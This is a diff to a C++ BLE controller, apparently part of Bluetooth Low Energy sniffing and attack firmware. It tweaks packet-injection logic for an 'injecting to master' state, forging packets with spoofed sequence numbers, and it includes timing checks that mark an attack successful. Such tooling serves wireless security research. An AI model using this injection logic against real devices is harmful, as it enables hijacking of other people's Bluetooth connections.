@@ -20,6 +20,14 @@ BLEController::BLEController(Radio *radio) : Controller(radio) {
 	this->advertisementsTransmitIndicator = true;
 }
 
+/*void BLEController::matchPattern(uint8_t pattern, size_t size) {
+
+}*/
+void BLEController::onMatch(uint8_t *buffer, size_t size) {
+	if ((buffer[0] & 3) == 2 && (buffer[1]) == 7) // && buffer[6] == 0xa)
+		return;
+}
+
 void BLEController::setFollowMode(bool follow) {
 	this->follow = follow;
 }
@@ -797,6 +805,7 @@ void BLEController::setHardwareConfiguration(uint32_t accessAddress, uint32_t cr
 	}
 	else {
 		this->radio->disableRssi(); // prevent time overhead in connected mode
+		//this->radio->enableMatch(9 + 1*8);
 	}
 	this->radio->setPhy(BLE_1MBITS);
 	this->radio->setHeader(1,8,0);
@@ -990,8 +999,8 @@ void BLEController::executeInjectionToMaster() {
 
 	// Forge an empty data packet with MD bit set to 1
 	uint8_t tx_buffer[2];
-	/*
-	tx_buffer[0] = (0x01 & 0xF3) | (this->simulatedSlaveSequenceNumbers.nesn  << 2) | (this->simulatedSlaveSequenceNumbers.sn << 3) | (1 << 4); // MD = 1
+
+	/*tx_buffer[0] = (0x01 & 0xF3) | (this->simulatedSlaveSequenceNumbers.nesn  << 2) | (this->simulatedSlaveSequenceNumbers.sn << 3) | (1 << 4); // MD = 1
 	tx_buffer[1] = 0x00;
 	this->radio->updateTXBuffer(tx_buffer,2);
 	*/
@@ -1000,7 +1009,7 @@ void BLEController::executeInjectionToMaster() {
 	 this->attackStatus.payload[0] = (this->attackStatus.payload[0] & 0xF3) | (this->simulatedSlaveSequenceNumbers.nesn  << 2) | (this->simulatedSlaveSequenceNumbers.sn << 3); // MD = 1
 	 this->radio->updateTXBuffer(this->attackStatus.payload,this->attackStatus.size);
 	 this->simulatedSlaveSequenceNumbers.sn = (this->simulatedSlaveSequenceNumbers.sn + 1) % 2; // necessary ?
-	 this->simulatedSlaveSequenceNumbers.nesn = (this->simulatedSlaveSequenceNumbers.nesn + 1) % 2; // necessary ?
+	 //this->simulatedSlaveSequenceNumbers.nesn = (this->simulatedSlaveSequenceNumbers.nesn + 1) % 2; // necessary ?
 	//this->setEmptyTransmitIndicator(true);
 
 
@@ -1402,7 +1411,14 @@ void BLEController::connectionSynchronizationProcessing(BLEPacket *pkt) {
 
 void BLEController::attackSynchronizationProcessing(BLEPacket *pkt) {
 	int32_t relativeTimestamp = (int32_t)(pkt->getTimestamp() - this->lastAnchorPoint);
-
+	if (this->controllerState == INJECTING_TO_MASTER && relativeTimestamp > 400) {
+		bsp_board_led_invert(0);
+		this->attackStatus.running = false;
+		this->attackStatus.successful = true;
+		this->exitSlaveMode();
+		//this->attackStatus.payload[0] = (this->attackStatus.payload[0] & 0xF3) | (this->simulatedSlaveSequenceNumbers.nesn  << 2) | (this->simulatedSlaveSequenceNumbers.sn << 3); // MD = 1
+		//this->radio->updateTXBuffer(this->attackStatus.payload,this->attackStatus.size);
+	}
 	if (relativeTimestamp > 2*1250) {
 	// If we received the packet after anchorPoint + 2*1250 us, it's a slave packet in response to our fake master packet
 		this->slavePacketProcessing(pkt);
@@ -1508,7 +1524,7 @@ void BLEController::connectionPacketProcessing(BLEPacket *pkt) {
 	this->connectionSynchronizationProcessing(pkt);
 
 	// If we are in an attack synchronization, run the corresponding processing
-	if (this->controllerState == SYNCHRONIZING_MITM || this->controllerState == SYNCHRONIZING_MASTER) {
+	if (this->controllerState == SYNCHRONIZING_MITM || this->controllerState == SYNCHRONIZING_MASTER || this->controllerState == INJECTING_TO_MASTER) {
 		this->attackSynchronizationProcessing(pkt);
 	}
 	// If we are in a role simulation, run the corresponding processing
